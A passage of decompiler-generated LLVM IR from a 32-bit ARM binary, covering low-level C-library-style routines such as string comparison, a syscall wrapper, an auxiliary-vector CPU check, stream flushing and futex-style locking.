  uselistorder label %dec_label_pc_16f68, { 2, 1, 0 }
}

define i32 @function_16f74(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16f74:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_16f78 = inttoptr i32 %arg2 to i8*
  %v2_16f78 = load i8, i8* %v1_16f78, align 1
  %v3_16f78 = zext i8 %v2_16f78 to i32
  %v3_16f7c = load i8, i8* %arg1, align 1
  %v4_16f7c = zext i8 %v3_16f7c to i32
  %v9_16f80 = icmp eq i8 %v2_16f78, %v3_16f7c
  br i1 %v9_16f80, label %dec_label_pc_16f9c, label %dec_label_pc_16fa4

dec_label_pc_16f8c:                               ; preds = %dec_label_pc_16f9c
  %v1_16f8c = add i32 %v0_16f8c, 1
  %v2_16f8c = inttoptr i32 %v1_16f8c to i8*
  %v3_16f8c = load i8, i8* %v2_16f8c, align 1
  %v4_16f8c = zext i8 %v3_16f8c to i32
  %v1_16f90 = add i32 %v0_16f90, 1
  %v2_16f90 = inttoptr i32 %v1_16f90 to i8*
  %v3_16f90 = load i8, i8* %v2_16f90, align 1
  %v4_16f90 = zext i8 %v3_16f90 to i32
  %v9_16f94 = icmp eq i8 %v3_16f8c, %v3_16f90
  br i1 %v9_16f94, label %dec_label_pc_16f9c, label %dec_label_pc_16fa4

dec_label_pc_16f9c:                               ; preds = %dec_label_pc_16f74, %dec_label_pc_16f8c
  %v0_16f9c = phi i32 [ %v4_16f8c, %dec_label_pc_16f8c ], [ %v3_16f78, %dec_label_pc_16f74 ]
  %v1_16fa49 = phi i32 [ %v4_16f8c, %dec_label_pc_16f8c ], [ %v4_16f7c, %dec_label_pc_16f74 ]
  %v0_16f90 = phi i32 [ %v1_16f90, %dec_label_pc_16f8c ], [ %tmp, %dec_label_pc_16f74 ]
  %v0_16f8c = phi i32 [ %v1_16f8c, %dec_label_pc_16f8c ], [ %arg2, %dec_label_pc_16f74 ]
  %v2_16f9c = icmp eq i32 %v0_16f9c, 0
  br i1 %v2_16f9c, label %dec_label_pc_16fa4, label %dec_label_pc_16f8c

dec_label_pc_16fa4:                               ; preds = %dec_label_pc_16f8c, %dec_label_pc_16f9c, %dec_label_pc_16f74
  %v1_16fa4 = phi i32 [ %v4_16f7c, %dec_label_pc_16f74 ], [ %v4_16f90, %dec_label_pc_16f8c ], [ %v1_16fa49, %dec_label_pc_16f9c ]
  %v0_16fa4 = phi i32 [ %v3_16f78, %dec_label_pc_16f74 ], [ %v4_16f8c, %dec_label_pc_16f8c ], [ 0, %dec_label_pc_16f9c ]
  %v2_16fa4 = sub nsw i32 %v1_16fa4, %v0_16fa4
  ret i32 %v2_16fa4

; uselistorder directives
  uselistorder i32 %v4_16f8c, { 0, 2, 1 }
  uselistorder i32 %v4_16f7c, { 1, 0 }
  uselistorder i32 %v3_16f78, { 1, 0 }
  uselistorder label %dec_label_pc_16fa4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16f9c, { 1, 0 }
}

define i32 @function_16fac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16fac:
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_16fd4 = call i32 @function_157a0(i32 162, i32 %arg1, i32 %arg2)
  store i32 %v3_16fd4, i32* @r0, align 4
  %v0_16fd8 = call i32 @function_131c4()
  ret i32 %v0_16fd8

; uselistorder directives
  uselistorder i32 ()* @function_131c4, { 16, 31, 30, 24, 29, 23, 22, 15, 28, 14, 18, 13, 17, 12, 11, 10, 9, 8, 19, 7, 2, 6, 20, 27, 5, 1, 4, 3, 26, 25, 21, 0 }
  uselistorder i32 (i32, i32, i32)* @function_157a0, { 6, 10, 8, 5, 4, 3, 2, 1, 9, 7, 0 }
}

define i32 @function_16fe8(i32 %arg1) local_unnamed_addr {
dec_label_pc_16fe8:
  %v2_16fec = load i32, i32* @global_var_22b28.532, align 4
  %v3_16ff0 = load i32, i32* @r4, align 4
  %v6_16ff0 = load i32, i32* @r5, align 4
  %v9_16ff0 = load i32, i32* @r6, align 4
  %v15_16ff0 = load i32, i32* @r8, align 4
  %v1_16ff4 = and i32 %v2_16fec, 32768
  %v2_16ff4 = icmp eq i32 %v1_16ff4, 0
  store i32 %arg1, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_15d48.629 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2234c.628 to i32), i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_22348.624 to i32), i32* @r4, align 4
  br i1 %v2_16ff4, label %dec_label_pc_170a8, label %dec_label_pc_17010

dec_label_pc_17010:                               ; preds = %dec_label_pc_16fe8
  %v3_17018 = load i32, i32* @global_var_22b3c.530, align 4
  store i32 sub (i32 89480, i32 ptrtoint (i32* @global_var_15d48.629 to i32)), i32* @global_var_2234c.628, align 4
  store i32 sub (i32 89392, i32 ptrtoint (i32* @global_var_15cf4.625 to i32)), i32* @global_var_22348.624, align 4
  %v1_170983 = inttoptr i32 %v3_17018 to i32*
  %v2_170984 = load i32, i32* %v1_170983, align 4
  %v2_1709c6 = icmp eq i32 %v2_170984, 0
  br i1 %v2_1709c6, label %dec_label_pc_170a4, label %dec_label_pc_1703c

dec_label_pc_1703c:                               ; preds = %dec_label_pc_17010, %dec_label_pc_17094
  %v0_17044 = phi i32 [ %v1_17094, %dec_label_pc_17094 ], [ %v3_17018, %dec_label_pc_17010 ]
  %v0_1703c = phi i32 [ %v2_17098, %dec_label_pc_17094 ], [ %v2_170984, %dec_label_pc_17010 ]
  %v7_1703c = icmp eq i32 %v0_1703c, 15
  br i1 %v7_1703c, label %dec_label_pc_17044, label %dec_label_pc_17094

dec_label_pc_17044:                               ; preds = %dec_label_pc_1703c
  %v1_17044 = add i32 %v0_17044, 4
  %v2_17044 = inttoptr i32 %v1_17044 to i32*
  %v3_17044 = load i32, i32* %v2_17044, align 4
  %v1_17048 = inttoptr i32 %v3_17044 to i8*
  %v2_17048 = load i8, i8* %v1_17048, align 1
  %v7_1704c = icmp eq i8 %v2_17048, 118
  br i1 %v7_1704c, label %dec_label_pc_17054, label %dec_label_pc_170a4

dec_label_pc_17054:                               ; preds = %dec_label_pc_17044
  %v1_17054 = add i32 %v3_17044, 1
  %v2_17054 = inttoptr i32 %v1_17054 to i8*
  %v3_17054 = load i8, i8* %v2_17054, align 1
  %v7_17058 = icmp eq i8 %v3_17054, 54
  br i1 %v7_17058, label %dec_label_pc_17060, label %dec_label_pc_170a4

dec_label_pc_17060:                               ; preds = %dec_label_pc_17054
  %v1_17060 = add i32 %v3_17044, 2
  %v2_17060 = inttoptr i32 %v1_17060 to i8*
  %v3_17060 = load i8, i8* %v2_17060, align 1
  %v4_17060 = zext i8 %v3_17060 to i32
  %v1_17064 = add nsw i32 %v4_17060, -48
  %tmp = icmp ult i32 %v1_17064, 10
  br i1 %tmp, label %dec_label_pc_170a4, label %dec_label_pc_17070

dec_label_pc_17070:                               ; preds = %dec_label_pc_17060
  store i32 sub (i32 89444, i32 ptrtoint (i32* @global_var_15d48.629 to i32)), i32* @global_var_2234c.628, align 4
  store i32 sub (i32 89384, i32 ptrtoint (i32* @global_var_15cf4.625 to i32)), i32* @global_var_22348.624, align 4
  br label %dec_label_pc_170a4

dec_label_pc_17094:                               ; preds = %dec_label_pc_1703c
  %v1_17094 = add i32 %v0_17044, 8
  %v1_17098 = inttoptr i32 %v1_17094 to i32*
  %v2_17098 = load i32, i32* %v1_17098, align 4
  %v2_1709c = icmp eq i32 %v2_17098, 0
  br i1 %v2_1709c, label %dec_label_pc_17098.dec_label_pc_170a4.loopexit_crit_edge, label %dec_label_pc_1703c

dec_label_pc_170a8:                               ; preds = %dec_label_pc_16fe8
  %v3_170ac = load i32, i32* inttoptr (i32 -61444 to i32*), align 4
  store i32 sub (i32 -61472, i32 ptrtoint (i32* @global_var_15dbc.632 to i32)), i32* @global_var_22350.631, align 4
  store i32 sub (i32 -61536, i32 ptrtoint (i32* @global_var_15cf4.625 to i32)), i32* @global_var_22348.624, align 4
  store i32 sub (i32 -61504, i32 ptrtoint (i32* @global_var_15d48.629 to i32)), i32* @global_var_2234c.628, align 4
  %v7_170e0 = icmp sgt i32 %v3_170ac, 1
  br i1 %v7_170e0, label %bb19, label %bb

bb:                                               ; preds = %dec_label_pc_170a8
  call void @llvm.trap()
  unreachable

bb19:                                             ; preds = %dec_label_pc_170a8
  %v7_170e4 = icmp eq i32 %v3_170ac, 2
  br i1 %v7_170e4, label %bb20, label %dec_label_pc_170a4

bb20:                                             ; preds = %bb19
  store i32 sub (i32 89344, i32 ptrtoint (i32* @global_var_15cf4.625 to i32)), i32* @global_var_22348.624, align 4
  br label %dec_label_pc_170a4

dec_label_pc_17098.dec_label_pc_170a4.loopexit_crit_edge: ; preds = %dec_label_pc_17094
  br label %dec_label_pc_170a4

dec_label_pc_170a4:                               ; preds = %bb19, %dec_label_pc_17010, %dec_label_pc_17098.dec_label_pc_170a4.loopexit_crit_edge, %dec_label_pc_17054, %dec_label_pc_17044, %dec_label_pc_17060, %dec_label_pc_17070, %bb20
  store i32 %v3_16ff0, i32* @r4, align 4
  store i32 %v6_16ff0, i32* @r5, align 4
  store i32 %v9_16ff0, i32* @r6, align 4
  store i32 %v15_16ff0, i32* @r8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_17098, { 1, 0 }
  uselistorder i32 %v1_17094, { 1, 0 }
  uselistorder i32 %v0_17044, { 1, 0 }
  uselistorder void ()* @llvm.trap, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 10, { 0, 6, 5, 15, 70, 8, 71, 1, 7, 80, 2, 16, 41, 72, 17, 42, 43, 32, 33, 10, 73, 34, 35, 18, 4, 36, 74, 19, 75, 20, 76, 21, 77, 22, 78, 79, 44, 45, 23, 24, 25, 12, 26, 13, 46, 47, 3, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 27, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 11, 69, 28, 81, 9, 82, 83, 30, 84, 37, 38, 14, 85, 39, 40, 29, 86, 31 }
  uselistorder i32* @global_var_22348.624, { 0, 1, 3, 2, 4 }
  uselistorder i32* @global_var_2234c.628, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_170a4, { 2, 7, 0, 6, 5, 3, 4, 1 }
  uselistorder label %dec_label_pc_1703c, { 1, 0 }
}

define i32 @function_1714c() local_unnamed_addr {
dec_label_pc_1714c:
  %v0_17158 = load i32, i32* @r0, align 4
  ret i32 %v0_17158
}

define i32 @function_1715c() local_unnamed_addr {
dec_label_pc_1715c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1715c = load i32, i32* @r4, align 4
  store i32 %v3_1715c, i32* %stack_var_-8, align 4
  %v0_17160 = load i32, i32* @r0, align 4
  %v1_17160 = add i32 %v0_17160, 74
  %v2_17160 = inttoptr i32 %v1_17160 to i8*
  %v3_17160 = load i8, i8* %v2_17160, align 1
  %v4_17160 = zext i8 %v3_17160 to i32
  store i32 %v4_17160, i32* @ip, align 4
  %v1_17164 = add i32 %v0_17160, 20
  %v2_17164 = inttoptr i32 %v1_17164 to i32*
  %v3_17164 = load i32, i32* %v2_17164, align 4
  %v1_17168 = add i32 %v0_17160, 44
  %v2_17168 = inttoptr i32 %v1_17168 to i32*
  %v3_17168 = load i32, i32* %v2_17168, align 4
  %v1_1716c = add nsw i32 %v4_17160, -1
  %v2_17170 = or i32 %v1_1716c, %v4_17160
  store i32 %v2_17170, i32* %r3.global-to-local, align 4
  %v3_17174 = icmp uge i32 %v3_17164, %v3_17168
  store i1 %v3_17174, i1* %cpsr_c.global-to-local, align 1
  %v9_17174 = icmp eq i32 %v3_17164, %v3_17168
  store i1 %v9_17174, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_17160, i32* %r4.global-to-local, align 4
  %v1_1717c = trunc i32 %v2_17170 to i8
  store i8 %v1_1717c, i8* %v2_17160, align 1
  %v0_17180 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_17180 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_17180 = xor i1 %v1_17180, true
  %v3_17180 = and i1 %v0_17180, %v2_17180
  br i1 %v3_17180, label %bb, label %dec_label_pc_1715c..thread8_crit_edge

dec_label_pc_1715c..thread8_crit_edge:            ; preds = %dec_label_pc_1715c
  %v0_17190.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_1715c
  %v4_17188 = load i32, i32* @r0, align 4
  %v5_17188 = add i32 %v4_17188, 36
  %v6_17188 = inttoptr i32 %v5_17188 to i32*
  %v7_17188 = load i32, i32* %v6_17188, align 4
  store i32 %v7_17188, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1715c..thread8_crit_edge, %bb
  %v0_17190 = phi i32 [ %v0_17190.pre, %dec_label_pc_1715c..thread8_crit_edge ], [ %v7_17188, %bb ]
  call void @__pseudo_cond_branch(i1 %v3_17180, i32 %v0_17190)
  %v0_17194 = load i32, i32* %r4.global-to-local, align 4
  %v1_17194 = inttoptr i32 %v0_17194 to i32*
  %v2_17194 = load i32, i32* %v1_17194, align 4
  store i32 %v2_17194, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1719c = and i32 %v2_17194, 4
  %v2_1719c = icmp eq i32 %v1_1719c, 0
  store i1 %v2_1719c, i1* %cpsr_z.global-to-local, align 1
  %v2_171a0 = add i32 %v0_17194, 20
  %v3_171a0 = inttoptr i32 %v2_171a0 to i32*
  store i32 0, i32* %v3_171a0, align 4
  %v0_171a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_171a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_171a4 = add i32 %v1_171a4, 16
  %v3_171a4 = inttoptr i32 %v2_171a4 to i32*
  store i32 %v0_171a4, i32* %v3_171a4, align 4
  %v0_171a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_171a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_171a8 = add i32 %v1_171a8, 28
  %v3_171a8 = inttoptr i32 %v2_171a8 to i32*
  store i32 %v0_171a8, i32* %v3_171a8, align 4
  br i1 %v2_1719c, label %dec_label_pc_171bc, label %.thread1

.thread1:                                         ; preds = %.thread8
  %v1_171ac = load i32, i32* @r2, align 4
  %v2_171ac = or i32 %v1_171ac, 32
  store i32 %v2_171ac, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_171b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_171b4 = inttoptr i32 %v2_171b4 to i32*
  store i32 %v2_171ac, i32* %v3_171b4, align 4
  br label %bb12

dec_label_pc_171bc:                               ; preds = %.thread8
  %v0_171bc = load i32, i32* %r4.global-to-local, align 4
  %v1_171bc = add i32 %v0_171bc, 44
  %v1_171c0 = inttoptr i32 %v1_171bc to i32*
  %v2_171c0 = load i32, i32* %v1_171c0, align 4
  %v3_171c0 = add i32 %v0_171bc, 48
  %v4_171c0 = inttoptr i32 %v3_171c0 to i32*
  %v5_171c0 = load i32, i32* %v4_171c0, align 4
  %v2_171c4 = add i32 %v5_171c0, %v2_171c0
  store i32 %v2_171c4, i32* %r3.global-to-local, align 4
  %v0_171c8 = load i32, i32* @r2, align 4
  %v1_171c8 = and i32 %v0_171c8, 16
  store i32 %v1_171c8, i32* %r0.global-to-local, align 4
  %v2_171c8 = icmp eq i32 %v1_171c8, 0
  store i1 %v2_171c8, i1* %cpsr_z.global-to-local, align 1
  %v2_171cc = add i32 %v0_171bc, 4
  %v3_171cc = inttoptr i32 %v2_171cc to i32*
  store i32 %v2_171c4, i32* %v3_171cc, align 4
  %v0_171d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_171d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_171d0 = add i32 %v1_171d0, 8
  %v3_171d0 = inttoptr i32 %v2_171d0 to i32*
  store i32 %v0_171d0, i32* %v3_171d0, align 4
  br i1 %v2_171c8, label %bb12, label %bb11

bb11:                                             ; preds = %dec_label_pc_171bc
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %bb12

bb12:                                             ; preds = %.thread1, %dec_label_pc_171bc, %bb11
  %v2_171d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_171d8, i32* @r4, align 4
  %v1_171dc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_171dc

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 48, { 0, 7, 11, 1, 5, 6, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 44, { 7, 8, 9, 3, 4, 5, 6, 1, 10, 0, 11, 2, 12 }
  uselistorder label %bb12, { 2, 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_171e0() local_unnamed_addr {
dec_label_pc_171e0:
  %v0_171e8 = call i32 @function_17274()
  ret i32 %v0_171e8
}

define i32 @function_171f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_171f8:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_171fc = icmp eq i32 %arg1, 0
  store i1 %v2_171fc, i1* @cpsr_z, align 1
  br i1 %v2_171fc, label %dec_label_pc_17268, label %dec_label_pc_17208

dec_label_pc_17208:                               ; preds = %dec_label_pc_171f8
  %v1_17208 = add i32 %arg1, 76
  %v2_17208 = inttoptr i32 %v1_17208 to i32*
  %v3_17208 = load i32, i32* %v2_17208, align 4
  %v3_17210 = icmp sgt i32 %v3_17208, -1
  call void @__pseudo_cond_branch(i1 %v3_17210, i32 ptrtoint (i32* @global_var_17380.685 to i32))
  %v0_17214 = load i32, i32* %r4.global-to-local, align 4
  %v1_17214 = add i32 %v0_17214, 20
  %v2_17214 = inttoptr i32 %v1_17214 to i32*
  %v3_17214 = load i32, i32* %v2_17214, align 4
  %v1_17218 = add i32 %v0_17214, 28
  %v2_17218 = inttoptr i32 %v1_17218 to i32*
  %v3_17218 = load i32, i32* %v2_17218, align 4
  %tmp = icmp ugt i32 %v3_17214, %v3_17218
  br i1 %tmp, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_17208
  store i32 %v0_17214, i32* %r0.global-to-local, align 4
  %v5_1722c = add i32 %v0_17214, 36
  %v6_1722c = inttoptr i32 %v5_1722c to i32*
  %v7_1722c = load i32, i32* %v6_1722c, align 4
  store i32 %v7_1722c, i32* @ip, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_17208, %bb
  %.04 = phi i32 [ %v7_1722c, %bb ], [ undef, %dec_label_pc_17208 ]
  call void @__pseudo_cond_branch(i1 %tmp, i32 %.04)
  %v0_17238 = load i32, i32* %r4.global-to-local, align 4
  %v1_17238 = add i32 %v0_17238, 4
  %v2_17238 = inttoptr i32 %v1_17238 to i32*
  %v3_17238 = load i32, i32* %v2_17238, align 4
  %v1_1723c = add i32 %v0_17238, 8
  %v2_1723c = inttoptr i32 %v1_1723c to i32*
  %v3_1723c = load i32, i32* %v2_1723c, align 4
  store i32 %v3_1723c, i32* @r2, align 4
  %v3_17240 = icmp ult i32 %v3_17238, %v3_1723c
  %v9_17240 = icmp eq i32 %v3_17238, %v3_1723c
  store i1 %v9_17240, i1* @cpsr_z, align 1
  br i1 %v3_17240, label %dec_label_pc_17248, label %dec_label_pc_17268

dec_label_pc_17248:                               ; preds = %.thread6
  %v2_17240 = sub i32 %v3_17238, %v3_1723c
  store i32 %v2_17240, i32* @r2, align 4
  store i32 %v0_17238, i32* %r0.global-to-local, align 4
  %v1_1725c = add i32 %v0_17238, 40
  %v2_1725c = inttoptr i32 %v1_1725c to i32*
  %v3_1725c = load i32, i32* %v2_1725c, align 4
  store i32 %v3_1725c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1725c)
  br label %dec_label_pc_17268

dec_label_pc_17268:                               ; preds = %.thread6, %dec_label_pc_171f8, %dec_label_pc_17248
  %v1_17270 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17270

; uselistorder directives
  uselistorder i1 %tmp, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 40, { 9, 19, 2, 20, 10, 3, 11, 4, 12, 13, 1, 14, 15, 0, 16, 18, 17, 6, 21, 7, 22, 5, 23, 8, 24 }
  uselistorder i32 28, { 10, 26, 29, 11, 30, 31, 43, 44, 8, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0, 12, 1, 13, 2, 14, 3, 15, 4, 16, 5, 17, 6, 18, 7, 9, 28, 27, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 20, { 20, 78, 79, 103, 104, 105, 106, 95, 96, 97, 98, 99, 100, 101, 102, 3, 24, 4, 21, 5, 22, 6, 23, 80, 81, 7, 82, 8, 83, 0, 84, 19, 25, 26, 9, 27, 28, 29, 30, 31, 32, 10, 33, 34, 36, 35, 37, 38, 11, 39, 40, 41, 43, 42, 44, 45, 46, 47, 12, 48, 49, 50, 52, 51, 53, 54, 55, 13, 56, 57, 58, 59, 61, 60, 14, 62, 63, 15, 64, 65, 66, 67, 68, 1, 69, 16, 70, 71, 72, 73, 2, 74, 17, 75, 76, 77, 85, 86, 87, 88, 89, 90, 91, 92, 93, 18, 94 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17268, { 2, 0, 1 }
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_17274() local_unnamed_addr {
dec_label_pc_17274:
  %tmp = load i32, i32* @r0, align 4
  ret i32 %tmp
}

define i32 @function_17274.1(i32 %arg1) local_unnamed_addr {
dec_label_pc_17274:
  store i32 %arg1, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17274 = load i32, i32* @r4, align 4
  store i32 %v3_17274, i32* %stack_var_-8, align 4
  %v6_17274 = load i32, i32* @lr, align 4
  %v0_17278 = call i32 @function_172d8()
  %storemerge.in1 = inttoptr i32 %v0_17278 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* @r4, align 4
  %v2_1728c4 = icmp eq i32 %storemerge2, 0
  br i1 %v2_1728c4, label %dec_label_pc_17294, label %dec_label_pc_17284

dec_label_pc_17284:                               ; preds = %dec_label_pc_17274, %dec_label_pc_17284
  %storemerge5 = phi i32 [ %storemerge, %dec_label_pc_17284 ], [ %storemerge2, %dec_label_pc_17274 ]
  %v1_17284 = call i32 @function_171f8(i32 %storemerge5)
  %v0_17288 = load i32, i32* @r4, align 4
  %v1_17288 = add i32 %v0_17288, 56
  %storemerge.in = inttoptr i32 %v1_17288 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_1728c = icmp eq i32 %storemerge, 0
  br i1 %v2_1728c, label %dec_label_pc_17294, label %dec_label_pc_17284

dec_label_pc_17294:                               ; preds = %dec_label_pc_17284, %dec_label_pc_17274
  %v2_17298 = load i32, i32* @global_var_2294c.687, align 4
  %v1_1729c = call i32 @function_171f8(i32 %v2_17298)
  %v2_172a4 = load i32, i32* @global_var_2294c.687, align 4
  %v2_172a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_172a8, i32* @r4, align 4
  store i32 %v6_17274, i32* @lr, align 4
  %v1_172ac = call i32 @function_171f8(i32 %v2_172a4)
  %v0_172b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_172b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17294
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17294, %bb
  %v2_172c4 = call i32 @function_156d0(i32* nonnull @global_var_22954.690)
  ret i32 %v2_172c4

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 56, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_171f8, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_17284, { 1, 0 }
}

define i32 @function_172d8() local_unnamed_addr {
dec_label_pc_172d8:
  %v2_172e4 = call i32 @function_1573c(i32* nonnull @global_var_22954.690)
  ret i32 ptrtoint (i32* @global_var_22950.693 to i32)
}

define i32 @function_17300(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17300:
  ret i32 %arg2
}

define i32 @function_17320(i32 %arg1) local_unnamed_addr {
dec_label_pc_17320:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17320 = load i32, i32* @r4, align 4
  store i32 %v3_17320, i32* %stack_var_-8, align 4
  %v1_17324 = add i32 %arg1, 76
  store i32 %v1_17324, i32* %r4.global-to-local, align 4
  %v0_17328 = call i32 @function_15ce4()
  store i32 %v0_17328, i32* @r0, align 4
  %v2_17330 = add i32 %v0_17328, 76
  %v3_17330 = inttoptr i32 %v2_17330 to i32*
  store i32 0, i32* %v3_17330, align 4
  %v0_17334 = call i32 @function_15ce4()
  %v1_17338 = add i32 %v0_17334, 80
  %v2_17338 = inttoptr i32 %v1_17338 to i32*
  %v3_17338 = load i32, i32* %v2_17338, align 4
  %v2_1733c = icmp eq i32 %v3_17338, 0
  br i1 %v2_1733c, label %dec_label_pc_17378, label %dec_label_pc_17344

dec_label_pc_17344:                               ; preds = %dec_label_pc_17320
  %v0_17348 = load i32, i32* %r4.global-to-local, align 4
  %v4_17354 = call i32 @function_17300(i32 240, i32 %v0_17348, i32 129, i32 1)
  %v4_1735c = icmp eq i32 %v4_17354, -38
  br i1 %v4_1735c, label %dec_label_pc_17360, label %dec_label_pc_17378

dec_label_pc_17360:                               ; preds = %dec_label_pc_17344
  %v0_17364 = load i32, i32* %r4.global-to-local, align 4
  %v2_17370 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17370, i32* %r4.global-to-local, align 4
  %v4_17374 = call i32 @function_17300(i32 240, i32 %v0_17364, i32 1, i32 1)
  br label %dec_label_pc_17378

dec_label_pc_17378:                               ; preds = %dec_label_pc_17344, %dec_label_pc_17320, %dec_label_pc_17360
  %v1_1737c = phi i32 [ %v4_17354, %dec_label_pc_17344 ], [ %v0_17334, %dec_label_pc_17320 ], [ %v4_17374, %dec_label_pc_17360 ]
  %v2_17378 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17378, i32* %r4.global-to-local, align 4
  ret i32 %v1_1737c

; uselistorder directives
  uselistorder i32 -38, { 9, 10, 11, 12, 17, 6, 14, 5, 13, 8, 7, 16, 15, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @function_17300, { 1, 0 }
  uselistorder i32 129, { 0, 1, 2, 3, 4, 13, 5, 6, 9, 10, 7, 8, 11, 12 }
  uselistorder i32 240, { 2, 4, 0, 5, 1, 3, 6, 11, 12, 19, 15, 16, 13, 14, 17, 18, 7, 8, 9, 10 }
  uselistorder i32 ()* @function_15ce4, { 28, 27, 24, 26, 25, 23, 22, 21, 20, 3, 2, 1, 0, 19, 18, 17, 16, 11, 10, 9, 8, 15, 14, 13, 12, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_17378, { 2, 0, 1 }
}

define i32 @function_17380(i32 %arg1) local_unnamed_addr {
dec_label_pc_17380:
  %v0_17388 = call i32 @function_15dac()
  %v1_1738c = add i32 %v0_17388, -176
  %v2_1738c = inttoptr i32 %v1_1738c to i32*
  %v3_1738c = load i32, i32* %v2_1738c, align 4
  store i32 %v3_1738c, i32* @r5, align 4
  %v1_17390 = add i32 %arg1, 76
  %v2_17390 = inttoptr i32 %v1_17390 to i32*
  %v3_17390 = load i32, i32* %v2_17390, align 4
  %v9_17394 = icmp eq i32 %v3_17390, %v3_1738c
  store i1 %v9_17394, i1* @cpsr_z, align 1
  br i1 %v9_17394, label %dec_label_pc_173e4, label %dec_label_pc_173a0

dec_label_pc_173a0:                               ; preds = %dec_label_pc_17380
  %v1_173a0 = add i32 %arg1, 80
  store i32 %v1_173a0, i32* @r6, align 4
  store i32 %v1_17390, i32* @r4, align 4
  %v4_173b411 = call i32 @function_15d38(i32 0, i32 %v3_1738c, i32* %v2_17390)
  %v2_173b813 = icmp eq i32 %v4_173b411, 0
  br i1 %v2_173b813, label %dec_label_pc_173e4, label %dec_label_pc_173c4

dec_label_pc_173c4:                               ; preds = %dec_label_pc_173a0, %dec_label_pc_173a8.backedge
  %v0_173c4 = load i32, i32* @r4, align 4
  %v1_173c4 = inttoptr i32 %v0_173c4 to i32*
  %v2_173c4 = load i32, i32* %v1_173c4, align 4
  store i32 %v2_173c4, i32* @r2, align 4
  %v2_173c8 = icmp eq i32 %v2_173c4, 0
  store i1 %v2_173c8, i1* @cpsr_z, align 1
  br i1 %v2_173c8, label %dec_label_pc_173a8.backedge, label %dec_label_pc_173d0

dec_label_pc_173d0:                               ; preds = %dec_label_pc_173c4
  %v0_173d4 = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  %v5_173dc = call i32 @function_15864(i32* %v1_173c4, i32 %v0_173d4)
  %v0_173ac.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_173a8.backedge

dec_label_pc_173a8.backedge:                      ; preds = %dec_label_pc_173d0, %dec_label_pc_173c4
